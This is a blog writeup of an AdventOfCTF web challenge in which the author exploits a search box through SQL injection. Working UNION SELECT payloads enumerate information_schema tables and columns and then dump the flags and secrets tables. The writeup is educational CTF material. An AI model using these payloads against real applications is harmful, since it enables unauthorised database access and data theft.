+++
author = "Maik de Kruif"
title = "Challenge 6 - AdventOfCTF"
date = 2020-12-06T15:24:45+01:00
description = "A writeup for challenge 6 of AdventOfCTF."
cover = "img/adventofctf/2020/c366d63edd4a35c9f8bea89e57401fef.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
    "sql-injection",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

- Points: 600

## Description

Search Santa's database of big secrets, you will probably find something useful.

Visit <https://06.adventofctf.com> to start the challenge.

## Finding the vulnerability

When opening the challenge website, we see a search bar. The description mentions a database so the search text is probably converted to a database query. The header also mentions that only the first 5 characters of each secret is shown. Let's try searching for "flag". This returns a table with one row:

| id  | Description   | Proof        |
| --- | ------------- | ------------ |
| 3   | Adven-------- | FLAG ------- |

Now let's try entering a quote (`'`). Hmm, now we get an empty table. Let's try some text with a quote. Now we get a MySQL error:

```text
Error description: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''%'' at line 1
```

This means we can probably do some SQL injection.

### SQL Injection

As we can see the result of the query on the screen, it's a little easier that last time. Firstly, let's think of what the query might be. It could be something like this:

```sql
SELECT id, descr, proof FROM santabase WHERE descr LIKE '%search text%' OR proof LIKE '%search text%'
```

If this were the query, we could use a `UNION SELECT` to add our own query. Let's try getting the table names. I came up with the following query:

```sql
UNION SELECT table_name, 2, 3 FROM information_schema.tables
```

The `2` and `3` in the `SELECT` are a filler because our guessed query has three columns. The use this query we have to escape the string in the query first. To do this, I added a `'` before our query and appended the symbols for a comment (`--`) at the end. This results in the following input: `' UNION SELECT table_name, 2, 3 FROM information_schema.tables -- `. This way the query that will be executed becomes this:

```sql
SELECT id, descr, proof FROM santabase WHERE descr LIKE '%' UNION SELECT table_name, 2, 3 FROM information_schema.tables -- %' OR proof LIKE '%' UNION SELECT table_name, 2, 3 FROM information_schema.tables -- %'
```

As you can see the string is escaped and the result of this query will have the result of our query at the end.

When submitting it I got the following result:

{{< code language="text" title="Result" >}}

```markdown
| id                                                 | Description   | Proof        |
| -------------------------------------------------- | ------------- | ------------ |
| 1                                                  | Acces-------- | The a------- |
| 2                                                  | KFC R-------- | The 1------- |
| 3                                                  | Adven-------- | FLAG ------- |
| 4                                                  | The d-------- | Do yo------- |
| ALL_PLUGINS                                        | 2--------     | 3-------     |
| APPLICABLE_ROLES                                   | 2--------     | 3-------     |
| CHARACTER_SETS                                     | 2--------     | 3-------     |
| CHECK_CONSTRAINTS                                  | 2--------     | 3-------     |
| COLLATIONS                                         | 2--------     | 3-------     |
| COLLATION_CHARACTER_SET_APPLICABILITY              | 2--------     | 3-------     |
| COLUMNS                                            | 2--------     | 3-------     |
| COLUMN_PRIVILEGES                                  | 2--------     | 3-------     |
| ENABLED_ROLES                                      | 2--------     | 3-------     |
| ENGINES                                            | 2--------     | 3-------     |
| EVENTS                                             | 2--------     | 3-------     |
| FILES                                              | 2--------     | 3-------     |
| GLOBAL_STATUS                                      | 2--------     | 3-------     |
| GLOBAL_VARIABLES                                   | 2--------     | 3-------     |
| KEY_CACHES                                         | 2--------     | 3-------     |
| KEY_COLUMN_USAGE                                   | 2--------     | 3-------     |
| PARAMETERS                                         | 2--------     | 3-------     |
| PARTITIONS                                         | 2--------     | 3-------     |
| PLUGINS                                            | 2--------     | 3-------     |
| PROCESSLIST                                        | 2--------     | 3-------     |
| PROFILING                                          | 2--------     | 3-------     |
| REFERENTIAL_CONSTRAINTS                            | 2--------     | 3-------     |
| ROUTINES                                           | 2--------     | 3-------     |
| SCHEMATA                                           | 2--------     | 3-------     |
| SCHEMA_PRIVILEGES                                  | 2--------     | 3-------     |
| SESSION_STATUS                                     | 2--------     | 3-------     |
| SESSION_VARIABLES                                  | 2--------     | 3-------     |
| STATISTICS                                         | 2--------     | 3-------     |
| SYSTEM_VARIABLES                                   | 2--------     | 3-------     |
| TABLES                                             | 2--------     | 3-------     |
| TABLESPACES                                        | 2--------     | 3-------     |
| TABLE_CONSTRAINTS                                  | 2--------     | 3-------     |
| TABLE_PRIVILEGES                                   | 2--------     | 3-------     |
| TRIGGERS                                           | 2--------     | 3-------     |
| USER_PRIVILEGES                                    | 2--------     | 3-------     |
| VIEWS                                              | 2--------     | 3-------     |
| GEOMETRY_COLUMNS                                   | 2--------     | 3-------     |
| SPATIAL_REF_SYS                                    | 2--------     | 3-------     |
| CLIENT_STATISTICS                                  | 2--------     | 3-------     |
| INDEX_STATISTICS                                   | 2--------     | 3-------     |
| INNODB_SYS_DATAFILES                               | 2--------     | 3-------     |
| USER_STATISTICS                                    | 2--------     | 3-------     |
| INNODB_SYS_TABLESTATS                              | 2--------     | 3-------     |
| INNODB_LOCKS                                       | 2--------     | 3-------     |
| INNODB_MUTEXES                                     | 2--------     | 3-------     |
| INNODB_CMPMEM                                      | 2--------     | 3-------     |
| INNODB_CMP_PER_INDEX                               | 2--------     | 3-------     |
| INNODB_CMP                                         | 2--------     | 3-------     |
| INNODB_FT_DELETED                                  | 2--------     | 3-------     |
| INNODB_CMP_RESET                                   | 2--------     | 3-------     |
| INNODB_LOCK_WAITS                                  | 2--------     | 3-------     |
| TABLE_STATISTICS                                   | 2--------     | 3-------     |
| INNODB_TABLESPACES_ENCRYPTION                      | 2--------     | 3-------     |
| INNODB_BUFFER_PAGE_LRU                             | 2--------     | 3-------     |
| INNODB_SYS_FIELDS                                  | 2--------     | 3-------     |
| INNODB_CMPMEM_RESET                                | 2--------     | 3-------     |
| INNODB_SYS_COLUMNS                                 | 2--------     | 3-------     |
| INNODB_FT_INDEX_TABLE                              | 2--------     | 3-------     |
| INNODB_CMP_PER_INDEX_RESET                         | 2--------     | 3-------     |
| user_variables                                     | 2--------     | 3-------     |
| INNODB_FT_INDEX_CACHE                              | 2--------     | 3-------     |
| INNODB_SYS_FOREIGN_COLS                            | 2--------     | 3-------     |
| INNODB_FT_BEING_DELETED                            | 2--------     | 3-------     |
| INNODB_BUFFER_POOL_STATS                           | 2--------     | 3-------     |
| INNODB_TRX                                         | 2--------     | 3-------     |
| INNODB_SYS_FOREIGN                                 | 2--------     | 3-------     |
| INNODB_SYS_TABLES                                  | 2--------     | 3-------     |
| INNODB_FT_DEFAULT_STOPWORD                         | 2--------     | 3-------     |
| INNODB_FT_CONFIG                                   | 2--------     | 3-------     |
| INNODB_BUFFER_PAGE                                 | 2--------     | 3-------     |
| INNODB_SYS_TABLESPACES                             | 2--------     | 3-------     |
| INNODB_METRICS                                     | 2--------     | 3-------     |
| INNODB_SYS_INDEXES                                 | 2--------     | 3-------     |
| INNODB_SYS_VIRTUAL                                 | 2--------     | 3-------     |
| INNODB_TABLESPACES_SCRUBBING                       | 2--------     | 3-------     |
| INNODB_SYS_SEMAPHORE_WAITS                         | 2--------     | 3-------     |
| plugin                                             | 2--------     | 3-------     |
| db                                                 | 2--------     | 3-------     |
| column_stats                                       | 2--------     | 3-------     |
| time_zone_name                                     | 2--------     | 3-------     |
| help_topic                                         | 2--------     | 3-------     |
| table_stats                                        | 2--------     | 3-------     |
| time_zone_transition                               | 2--------     | 3-------     |
| user                                               | 2--------     | 3-------     |
| help_relation                                      | 2--------     | 3-------     |
| host                                               | 2--------     | 3-------     |
| index_stats                                        | 2--------     | 3-------     |
| slow_log                                           | 2--------     | 3-------     |
| tables_priv                                        | 2--------     | 3-------     |
| proxies_priv                                       | 2--------     | 3-------     |
| columns_priv                                       | 2--------     | 3-------     |
| event                                              | 2--------     | 3-------     |
| general_log                                        | 2--------     | 3-------     |
| innodb_index_stats                                 | 2--------     | 3-------     |
| time_zone_transition_type                          | 2--------     | 3-------     |
| procs_priv                                         | 2--------     | 3-------     |
| time_zone_leap_second                              | 2--------     | 3-------     |
| gtid_slave_pos                                     | 2--------     | 3-------     |
| innodb_table_stats                                 | 2--------     | 3-------     |
| time_zone                                          | 2--------     | 3-------     |
| help_keyword                                       | 2--------     | 3-------     |
| transaction_registry                               | 2--------     | 3-------     |
| servers                                            | 2--------     | 3-------     |
| roles_mapping                                      | 2--------     | 3-------     |
| proc                                               | 2--------     | 3-------     |
| func                                               | 2--------     | 3-------     |
| help_category                                      | 2--------     | 3-------     |
| cond_instances                                     | 2--------     | 3-------     |
| events_waits_current                               | 2--------     | 3-------     |
| events_waits_history                               | 2--------     | 3-------     |
| events_waits_history_long                          | 2--------     | 3-------     |
| events_waits_summary_by_host_by_event_name         | 2--------     | 3-------     |
| events_waits_summary_by_instance                   | 2--------     | 3-------     |
| events_waits_summary_by_thread_by_event_name       | 2--------     | 3-------     |
| events_waits_summary_by_user_by_event_name         | 2--------     | 3-------     |
| events_waits_summary_by_account_by_event_name      | 2--------     | 3-------     |
| events_waits_summary_global_by_event_name          | 2--------     | 3-------     |
| file_instances                                     | 2--------     | 3-------     |
| file_summary_by_event_name                         | 2--------     | 3-------     |
| file_summary_by_instance                           | 2--------     | 3-------     |
| host_cache                                         | 2--------     | 3-------     |
| mutex_instances                                    | 2--------     | 3-------     |
| objects_summary_global_by_type                     | 2--------     | 3-------     |
| performance_timers                                 | 2--------     | 3-------     |
| rwlock_instances                                   | 2--------     | 3-------     |
| setup_actors                                       | 2--------     | 3-------     |
| setup_consumers                                    | 2--------     | 3-------     |
| setup_instruments                                  | 2--------     | 3-------     |
| setup_objects                                      | 2--------     | 3-------     |
| setup_timers                                       | 2--------     | 3-------     |
| table_io_waits_summary_by_index_usage              | 2--------     | 3-------     |
| table_io_waits_summary_by_table                    | 2--------     | 3-------     |
| table_lock_waits_summary_by_table                  | 2--------     | 3-------     |
| threads                                            | 2--------     | 3-------     |
| events_stages_current                              | 2--------     | 3-------     |
| events_stages_history                              | 2--------     | 3-------     |
| events_stages_history_long                         | 2--------     | 3-------     |
| events_stages_summary_by_thread_by_event_name      | 2--------     | 3-------     |
| events_stages_summary_by_account_by_event_name     | 2--------     | 3-------     |
| events_stages_summary_by_user_by_event_name        | 2--------     | 3-------     |
| events_stages_summary_by_host_by_event_name        | 2--------     | 3-------     |
| events_stages_summary_global_by_event_name         | 2--------     | 3-------     |
| events_statements_current                          | 2--------     | 3-------     |
| events_statements_history                          | 2--------     | 3-------     |
| events_statements_history_long                     | 2--------     | 3-------     |
| events_statements_summary_by_thread_by_event_name  | 2--------     | 3-------     |
| events_statements_summary_by_account_by_event_name | 2--------     | 3-------     |
| events_statements_summary_by_user_by_event_name    | 2--------     | 3-------     |
| events_statements_summary_by_host_by_event_name    | 2--------     | 3-------     |
| events_statements_summary_global_by_event_name     | 2--------     | 3-------     |
| events_statements_summary_by_digest                | 2--------     | 3-------     |
| users                                              | 2--------     | 3-------     |
| accounts                                           | 2--------     | 3-------     |
| hosts                                              | 2--------     | 3-------     |
| socket_instances                                   | 2--------     | 3-------     |
| socket_summary_by_instance                         | 2--------     | 3-------     |
| socket_summary_by_event_name                       | 2--------     | 3-------     |
| session_connect_attrs                              | 2--------     | 3-------     |
| session_account_connect_attrs                      | 2--------     | 3-------     |
| flags                                              | 2--------     | 3-------     |
| secrets                                            | 2--------     | 3-------     |
```

{{< /code >}}

## Solution

The flags table at the bottom looks interesting. Let's grab it's contents. To get it's contents, I came up with the following query:

```sql
UNION SELECT (SELECT * FROM flags), 2, 3
```

This query also has to be converted to an input first. This will become `' UNION SELECT (SELECT * FROM flags), 2, 3 -- `.

After submitting this input, I got the flag: `NOVI{7h1s_flag_w@s_chuncky_right}`.

\*Note: this only works if a table has only one column, if it has more, you have to get the columns first. See the [Getting the secrets]({{< ref "#getting-the-secrets" >}}) for more info about that.

This flag can then be submitted for the [challenge](https://ctfd.adventofctf.com/challenges#6-7).

_For more information about how SQL injection works, please read my [previous post]({{< ref "challenge_5.md" >}})._

## (Optional) Getting the secrets 😋 {#getting-the-secrets}

Because the `secrets` table a more than one column, we need to know the column names first. We can get them with the following query:

```sql
UNION SELECT column_name, 2, 3 FROM information_schema.columns WHERE table_name = "secrets"
```

Converted to an input: `' UNION SELECT column_name, 2, 3 FROM information_schema.columns WHERE table_name = "secrets" -- `.

After remove the results from the original query, we get the following:

| id          | Description | Proof    |
| ----------- | ----------- | -------- |
| id          | 2--------   | 3------- |
| description | 2--------   | 3------- |
| proof       | 2--------   | 3------- |

We can then put these column names in our query:

```sql
UNION SELECT CONCAT(id, ":", description, ":", proof), 2, 3 FROM secrets
```

The `CONCAT()` here is to put our results into the first column as the other two column are hidden after the first five characters.

This query converts to `' UNION SELECT CONCAT(id, ":", description, ":", proof), 2, 3 FROM secrets -- ` as the input.

After parsing the output we get:

| id  | Description              | Proof                                                                                                               |
| --- | ------------------------ | ------------------------------------------------------------------------------------------------------------------- |
| 1   | Access codes for Area 51 | The access code is 1234                                                                                             |
| 2   | KFC Recipe               | The 10 spices are in the diary on page 658                                                                          |
| 3   | Advent of Code           | FLAG are such a good thing to find, but this is not it. I do really love that you are playing the game! Keep it up. |
| 4   | The door                 | Do you know where that one door leads? It leads to the basement!                                                    |
